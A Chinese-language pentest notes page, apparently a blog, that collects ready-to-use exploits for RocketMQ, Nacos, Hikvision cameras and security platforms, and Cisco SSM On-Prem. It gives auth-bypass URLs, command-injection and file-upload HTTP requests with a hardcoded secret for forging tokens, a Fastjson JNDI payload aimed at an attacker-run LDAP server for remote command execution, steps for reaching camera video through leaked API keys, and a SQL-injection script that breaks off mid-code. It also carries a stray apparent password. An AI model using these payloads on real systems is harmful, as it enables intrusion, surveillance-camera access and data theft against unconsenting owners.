<p> CVE-2023-37582 中，由于对 CVE-2023-33246 修复不完善，导致在Apache RocketMQ NameServer 存在未授权访问的情况下，攻击者可构造恶意请求以RocketMQ运行的系统用户身份执行命令。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 check.py --ip 127.0.0.1 --port 9876</span><br><span class="line">python3 check.py --cidr 192.168.1.0/24</span><br><span class="line"># or </span><br><span class="line">python3 check.py --file rocketmq_targets.txt --port 9876</span><br><span class="line"># target in file format:</span><br><span class="line"># ip</span><br><span class="line"># ip:port</span><br><span class="line"># http://ip:port</span><br></pre></td></tr></table></figure>

<p>@J@#DaTang2023</p>
<h3 id="nacos"><a href="#nacos" class="headerlink" title="nacos"></a>nacos</h3><p>未授权访问</p>
<p><a href="http://x.x.x.x:xxxx/nacos/v1/auth/users?pageNo=1&pageSize=9（ip和端口用x代替）">http://x.x.x.x:xxxx/nacos/v1/auth/users?pageNo=1&amp;pageSize=9（ip和端口用x代替）</a></p>
<p>可以看到账号密码</p>
<p>get 参数改成post然后提交一个新的用户名和密码</p>
<p>POST <a href="https://link.zhihu.com/?target=http://IP">http://IP</a>:端口&#x2F;nacos&#x2F;v1&#x2F;auth&#x2F;users?username&#x3D;test1&amp;password&#x3D;test1</p>
<p>这个时候我们用test1登录</p>
<h3 id="海康威视"><a href="#海康威视" class="headerlink" title="海康威视"></a>海康威视</h3><h4 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h4><p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1686651655167.png" alt="1686651655167"></p>
<h4 id="cve-2017-7921-x2F-7923"><a href="#cve-2017-7921-x2F-7923" class="headerlink" title="cve-2017-7921&#x2F;7923"></a>cve-2017-7921&#x2F;7923</h4><p><strong>影响范围</strong></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1686651720225.png" alt="1686651720225"></p>
<p><strong>排查步骤</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip/Security/users?auth=YWRtaW46MTEKYWRtaW46MTEK</span><br></pre></td></tr></table></figure>

<p>auth内容是admin:11的base64编码。</p>
<p>获取系统监控快照，不需要进行身份验证。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip/onvif-http/snapshot?auth=YWRtaW46MTEK</span><br></pre></td></tr></table></figure>

<p>下载摄像机配置文件，通过脚本解密配置文件获得账密信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip/System/configurationFile?auth=YWRtaW46MTEK</span><br></pre></td></tr></table></figure>

<p>用hex编辑器打开下载的configurationFile文件发现是加密后的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># https://github.com/chrisjd20/hikvision_CVE-2017-7921_auth_bypass_config_decryptor</span><br><span class="line">python3 decrypt_configurationFile.py configurationFile</span><br></pre></td></tr></table></figure>

<h4 id="cve-2021-36260"><a href="#cve-2021-36260" class="headerlink" title="cve-2021-36260"></a>cve-2021-36260</h4><p>影响范围</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img640" alt="图片"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1686652093950.png" alt="1686652093950"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1686652112690.png" alt="1686652112690"></p>
<p>漏洞poc</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PUT /SDK/webLanguage HTTP/1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)</span><br><span class="line">AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 89</span><br><span class="line"></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span></span><br><span class="line">encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;&lt;language&gt;$(ifconfig -a &gt;</span><br><span class="line">webLib/dd.asp)&lt;/language&gt;</span><br></pre></td></tr></table></figure>

<h4 id="海康威视流媒体管理服务器后台任意文件读取漏洞"><a href="#海康威视流媒体管理服务器后台任意文件读取漏洞" class="headerlink" title="海康威视流媒体管理服务器后台任意文件读取漏洞"></a>海康威视流媒体管理服务器后台任意文件读取漏洞</h4><p><strong>影响范围</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">流媒体管理服务器 V2.3.5</span><br></pre></td></tr></table></figure>

<p><strong>奇安信语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web.title=&quot;流媒体管理服务器&quot;</span><br></pre></td></tr></table></figure>

<p><strong>poc</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxx.xxx.xxx.xxx/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini</span><br></pre></td></tr></table></figure>

<p>fileName未输入文件名时，返回包会报错，错误信息中包含网站的部分绝对路径信息，经过路径构造可以获取当前php文件的内容</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1686652380656.png" alt="1686652380656"></p>
<p>漏洞修复</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>php.ini 配置 open_basedir（针对PHP应用程序）。</span><br><span class="line"><span class="number">2.</span>用户输入配置白名单，对文件下载类型进行检查，判断是否为允许下载类型。</span><br><span class="line"><span class="number">3.</span>过滤路径回溯符../，或者直接将..替换成空。对参数进行过滤，依次过滤“.”、“..”、“/”、“\”等字符。</span><br><span class="line"><span class="number">4.</span>对于下载文件的目录做好限制，只能下载定目录下的文件，或者将要下载的资源文件路径存入数据库，附件下载时定数据库中的id即可，id即对应的资源。</span><br><span class="line"></span><br><span class="line">参考代码：</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileReader</span> &#123;</span><br><span class="line">    <span class="comment">// 正则表达式，用于过滤路径中的 ../ 字符串</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Pattern</span> <span class="variable">SAFE_PATH_PATTERN</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;[^/]+/\\.\\./&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 安全读取文件</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] readSafely(String path) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 将路径中的 ../ 替换为空字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">safePath</span> <span class="operator">=</span> SAFE_PATH_PATTERN.matcher(path).replaceAll(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用安全路径读取文件</span></span><br><span class="line">        <span class="type">Path</span> <span class="variable">filePath</span> <span class="operator">=</span> Paths.get(safePath);</span><br><span class="line">        <span class="keyword">return</span> Files.readAllBytes(filePath);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">这段代码中使用了正则表达式来过滤路径中的 ../ 字符串，确保文件只能被读取到预期的位置。</span><br><span class="line"></span><br><span class="line">使用方法：</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] fileData = FileReader.readSafely(<span class="string">&quot;/path/to/file&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    <span class="comment">// 处理异常</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="海康威视iVMS综合安防系统任意文件上传漏洞（0day）"><a href="#海康威视iVMS综合安防系统任意文件上传漏洞（0day）" class="headerlink" title="海康威视iVMS综合安防系统任意文件上传漏洞（0day）"></a><strong>海康威视iVMS综合安防系统任意文件上传漏洞（0day）</strong></h4><p><strong>漏洞描述</strong></p>
<p>海康威视iVMS系统存在在野 0day 漏洞，攻击者通过获取密钥任意构造token，请求&#x2F;resourceOperations&#x2F;upload接口任意上传文件，导致获取服务器webshell权限，同时可远程进行恶意代码执行。</p>
<p><strong>影响范围</strong></p>
<p>1.海康威视综合安防系统iVMS-5000</p>
<p>2.海康威视综合安防系统 iVMS-8700</p>
<p><strong>奇安信语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web.body=&quot;/views/home/file/installPackage.rar&quot;</span><br></pre></td></tr></table></figure>

<p><strong>漏洞poc</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /eps/api/resourceOperations/upload?token=构造的token值 HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: ISMS_8700_Sessionname=A29E70BEA1FDA82E2CF0805C3A389988</span><br><span class="line">Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo</span><br><span class="line">Upgrade-Insecure-Requests: 1Content-Length: 174</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryGEJwiloiPo</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;fileUploader&quot;</span>;filename=<span class="string">&quot;1.jsp&quot;</span></span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span></span><br><span class="line">------WebKitFormBoundaryGEJwiloiPo</span><br></pre></td></tr></table></figure>

<p>构造token绕过认证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /eps/api/resourceOperations/upload HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://you-ip</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: ISMS_8700_Sessionname=7634604FBE659A8532E666FE4AA41BE9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 62</span><br><span class="line"></span><br><span class="line">service=http%3A%2F%2Fx.x.x.x%3Ax%2Fhome%2Findex.action</span><br></pre></td></tr></table></figure>

<p>构造token绕过认证  （内部机制：如果token值与请求url+secretkey的md5值相同就可以绕过认证）</p>
<p>secretkey是代码里写死的（默认值：secretKeyIbuilding）</p>
<p>token值需要进行MD5加密（32位大写）</p>
<p>组合：token&#x3D;MD5(url+”secretKeyIbuilding”)</p>
<blockquote>
<p>md5加密 ：<a target="_blank" rel="noopener" href="http://x.x.x//eps/api/resourceOperations/uploadsecretKeyIbuilding">http://x.x.x//eps/api/resourceOperations/uploadsecretKeyIbuilding</a></p>
</blockquote>
<p>重新验证，构造文件上传poyload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">POST /eps/api/resourceOperations/upload?token=构造的token值 HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: ISMS_8700_Sessionname=A29E70BEA1FDA82E2CF0805C3A389988</span><br><span class="line">Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 174</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryGEJwiloiPo</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileUploader&quot;;filename=&quot;1.jsp&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">test</span><br><span class="line">------WebKitFormBoundaryGEJwiloiPo</span><br></pre></td></tr></table></figure>

<p>显示上传成功且返回了resourceUuid值</p>
<p>验证路径：<a target="_blank" rel="noopener" href="http://url/eps/upload/resourceUuid%E7%9A%84%E5%80%BC.jsp">http://url/eps/upload/resourceUuid的值.jsp</a></p>
<h4 id="海康威视IVMS系统任意文件上传漏洞"><a href="#海康威视IVMS系统任意文件上传漏洞" class="headerlink" title="海康威视IVMS系统任意文件上传漏洞"></a><strong>海康威视IVMS系统任意文件上传漏洞</strong></h4><p><strong>检测POC</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/sccmdaveli/hikvision-poc</span><br></pre></td></tr></table></figure>

<p><strong>漏洞修复</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1.</span>在服务器后端控制上传文件类型，处理时强制使用随机数改写文件名和文件路径,不要使用用户自定义的文件名和文件路径。</span><br><span class="line"><span class="number">2.</span>在服务器后端建议使用白名单的方法对上传的文件进行过滤，上传的目录不进行解析，只提供下载权限。</span><br><span class="line"><span class="number">3.</span>开源编辑器上传漏洞：若新版编辑器已修复漏洞，请更新编辑器版本。</span><br><span class="line"><span class="number">4.</span>除了以上的方法之外，还可将被上传的文件限制在某一路径下，并在文件上传目录禁止脚本解析。</span><br><span class="line"></span><br><span class="line">参考代码：</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.security.SecureRandom;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Part;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileUploadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ALLOWED_FILE_TYPES</span> <span class="operator">=</span> <span class="string">&quot;image/jpeg,image/png,image/gif&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">SecureRandom</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecureRandom</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">      <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="comment">// 获取上传的文件</span></span><br><span class="line">    <span class="type">Part</span> <span class="variable">filePart</span> <span class="operator">=</span> request.getPart(<span class="string">&quot;file&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查文件类型是否被允许</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">fileType</span> <span class="operator">=</span> filePart.getContentType();</span><br><span class="line">    <span class="keyword">if</span> (!ALLOWED_FILE_TYPES.contains(fileType)) &#123;</span><br><span class="line">      response.sendError(HttpServletResponse.SC_BAD_REQUEST, <span class="string">&quot;Invalid file type.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用随机数改写文件名和文件路径</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> generateRandomFileName(filePart.getSubmittedFileName());</span><br><span class="line">    <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> request.getServletContext().getRealPath(<span class="string">&quot;/&quot;</span>) + File.separator + <span class="string">&quot;uploads&quot;</span> + File.separator + fileName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存文件</span></span><br><span class="line">    filePart.write(filePath);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回响应</span></span><br><span class="line">    response.setStatus(HttpServletResponse.SC_OK);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">generateRandomFileName</span><span class="params">(String fileName)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">randomNumber</span> <span class="operator">=</span> random.nextInt();</span><br><span class="line">    String[] fileNameParts = fileName.split(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">fileExtension</span> <span class="operator">=</span> fileNameParts[fileNameParts.length - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">return</span> randomNumber + <span class="string">&quot;.&quot;</span> + fileExtension;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">在上面的代码中，我们首先使用 getPart 方法获取上传的文件。然后检查文件类型是否在允许的文件类型列表中。如果不在，则发送错误响应。否则，我们使用随机数改写文件名和文件路径。最后，我们使用 write 方法将文件写入磁盘，并返回响应。</span><br></pre></td></tr></table></figure>

<h4 id="海康威视综合安防管理平台存在Fastjson远程命令执行漏洞（2022-HVV洞）"><a href="#海康威视综合安防管理平台存在Fastjson远程命令执行漏洞（2022-HVV洞）" class="headerlink" title="海康威视综合安防管理平台存在Fastjson远程命令执行漏洞（2022 HVV洞）"></a><strong>海康威视综合安防管理平台存在Fastjson远程命令执行漏洞（2022 HVV洞）</strong></h4><p><strong>漏洞描述</strong></p>
<p>海康威视综合安防管理平台存在Fastjson远程命令执行漏洞，该漏洞可执行系统命令，直接获取服务器权限。</p>
<p><strong>搜索引擎语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;HIKVISION-综合安防管理平台&quot;</span><br></pre></td></tr></table></figure>

<p><strong>poc</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /bic/ssoService/v1/applyCT HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Dnt: 1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Te: trailers</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 215</span><br><span class="line"></span><br><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://2vyvoa.dnslog.cn&quot;,&quot;autoCommit&quot;:true&#125;,&quot;hfe4zyyzldp&quot;:&quot;=&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>先看看能不能连dnslog服务器，如果dnslog服务器收到请求，则大概率存在命令执行漏洞 </p>
<p>确定dnslog能收到请求之后，使用工具JNDIExploit-1.2-SNAPSHOT.jar 进一步利用。把该工具上传到公网服务器后，执行如下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 你的公网服务器ip</span><br></pre></td></tr></table></figure>

<p>记得对外开放1389 8080端口哦 </p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613185125656.png" alt="image-20230613185125656"></p>
<p>然后就在数据包的头部加上 cmd: whoami  这里whoami也可以改成你想执行的命令</p>
<p>存在注入的地方改成  ldap:&#x2F;&#x2F;这里是的你公网服务器ip地址:1389&#x2F;Basic&#x2F;TomcatEcho</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">POST /bic/ssoService/v1/applyCT HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Dnt: 1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Te: trailers</span><br><span class="line">Content-Type: application/json</span><br><span class="line">cmd: whoami</span><br><span class="line">Content-Length: 215</span><br><span class="line"></span><br><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://这里是的你公网服务器ip地址:1389/Basic/TomcatEcho&quot;,&quot;autoCommit&quot;:true&#125;,&quot;hfe4zyyzldp&quot;:&quot;=&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>成功执行whoami</p>
<p><strong>漏洞修复</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.hikvision.com/cn/support/CybersecurityCenter/SecurityNotices/</span><br></pre></td></tr></table></figure>

<h4 id="海康威视AK信息泄露漏洞"><a href="#海康威视AK信息泄露漏洞" class="headerlink" title="海康威视AK信息泄露漏洞"></a><strong>海康威视AK信息泄露漏洞</strong></h4><p>进行js多次查看发现存在jsconfig的调用。</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613185345443.png" alt="image-20230613185345443"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613185405052.png" alt="image-20230613185405052"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613185415011.png" alt="image-20230613185415011"></p>
<p>appkey就是user 由一个8位数数构成:23412412</p>
<p>Secret就是passwd，由21位的密钥构成:QfQPss5GOac9Bjxkfuv3</p>
<p>官方提供api接口文档</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://open.hikvision.com/docs/docId?productId=5c67f1e2f05948198c909700&amp;version=%2Ff95e951cefc54578b523d1738f65f0a1&amp;curNodeId=16741aecc05944a6b0cd1341d68e4546</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1./api/resource/v2/encodeDevice/search接口,获取权限的编码设备列表</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2./api/resource/v1/cameras 获取cameraIndexCode</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3./api/video/v1/manualCapture 带cameraIndexCode去获取摄像头的Picurl</span><br></pre></td></tr></table></figure>

<p><strong>利用rtsp协议去访问</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用/api/video/v2/cameras/previewURLs 接口 。获取获取rtsp协议摄像</span><br></pre></td></tr></table></figure>

<p><strong>这里借助借助VLC media player 播放去访问rtsp协议摄像头</strong></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613185641997.png" alt="image-20230613185641997"></p>
<h3 id="思科"><a href="#思科" class="headerlink" title="思科"></a>思科</h3><blockquote>
<p>Cisco Smart Software Manager On-Prem (SSM On-Prem) 基于 Web 的管理界面中存在漏洞，可能允许经过身份验证的远程攻击者对受影响的系统进行 SQL 注入攻击。该漏洞的存在是因为基于 Web 的管理界面无法充分验证用户输入。攻击者可以通过以低权限用户身份向应用程序进行身份验证并向受影响的系统发送精心设计的 SQL 查询来利用此漏洞。</p>
</blockquote>
<p>1.改poc里边的ip和cookie</p>
<p>2.python exploit.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Smart Software Manager On-Prem Release 8-202212 - Authenticated SQL Injection in &#x27;filter_by&#x27; parameter</span></span><br><span class="line"><span class="string">Download link: https://software.cisco.com/download/home/286285506/type/286326948/release/8-202212</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Usage:</span></span><br><span class="line"><span class="string">1. Update host and cookies variables,</span></span><br><span class="line"><span class="string">2. Run `python3 exploit.py`</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Tested on Ubuntu 22.04.1 LTS, Python 3.10.6</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">by redfr0g@stmcyber 2023</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="comment"># script parameters, update accoridingly</span></span><br><span class="line">host = <span class="string">&quot;&lt;IP&gt;:8443&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;_lic_engine_session&quot;</span>: <span class="string">&quot;&lt;COOKIE&gt;&quot;</span>, <span class="string">&quot;XSRF-TOKEN&quot;</span>: <span class="string">&quot;&lt;CSRFTOKEN&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://&quot;</span> + host + <span class="string">&quot;/backend/notifications/search_account_notifications.json?filter_by=message_type))%20LIKE%20%27%25%27+OR+1+%3d+1/+(SELECT+CASE+WHEN+(select+version()+LIKE+&#x27;P%25&#x27;)+THEN+0+ELSE+1+END)--%20&amp;filter_val=a&amp;offset=0&amp;limit=10&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line">chars = string.printable[<span class="number">0</span>:<span class="number">95</span>]</span><br><span class="line">result = []</span><br><span class="line">search = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Cisco Smart Software Manager Release 8-202212 SQL Injection PoC&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Starting DBMS banner enumeration...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># do error based sql injection until no match found</span></span><br><span class="line"><span class="keyword">while</span> search:</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        url = <span class="string">&quot;https://&quot;</span> + host + <span class="string">&quot;/backend/notifications/search_account_notifications.json?filter_by=message_type))%20LIKE%20%27%25%27+OR+1+%3d+1/+(SELECT+CASE+WHEN+(select+version()+LIKE+&#x27;&quot;</span> + <span class="string">&#x27;&#x27;</span>.join(result) + char + <span class="string">&quot;%25&#x27;)+THEN+0+ELSE+1+END)--%20&amp;filter_val=a&amp;offset=0&amp;limit=10&quot;</span></span><br><span class="line">        <span class="comment"># disable invalid cert warnings</span></span><br><span class="line">        <span class="keyword">with</span> warnings.catch_warnings():</span><br><span class="line">            